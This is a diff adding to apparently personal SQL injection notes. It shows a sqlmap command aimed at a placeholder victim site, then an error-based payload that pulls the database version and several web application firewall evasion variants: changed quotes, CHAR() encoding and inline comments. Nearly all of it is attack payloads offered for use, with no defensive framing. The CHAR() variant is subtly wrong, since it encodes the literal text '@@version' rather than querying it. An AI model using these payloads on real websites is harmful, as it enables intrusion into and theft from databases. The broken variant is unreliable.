@@ -15,3 +15,30 @@ sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=E --banner
 
 
 👉 --technique=E tells sqlmap to use Error-based injection.
+
+
+-----------------------------------------------------------------------------------------
+
+SQLi + WAF Bypass Techniques
+1️⃣ Error-Based SQLi
+
+Normal Payload:
+
+' AND 1=CONVERT(int,(SELECT @@version))--
+
+
+Bypass Tricks:
+
+Change quotes:
+
+" AND 1=CONVERT(int,(SELECT @@version))--
+
+
+Use CHAR() instead of strings:
+
+AND 1=CONVERT(int,(SELECT CHAR(64,64,118,101,114,115,105,111,110)))
+
+
+Use inline comments to break keywords (WAF signature evasion):
+
+AND/**/1=CONVERT(int,(SELECT@@version))
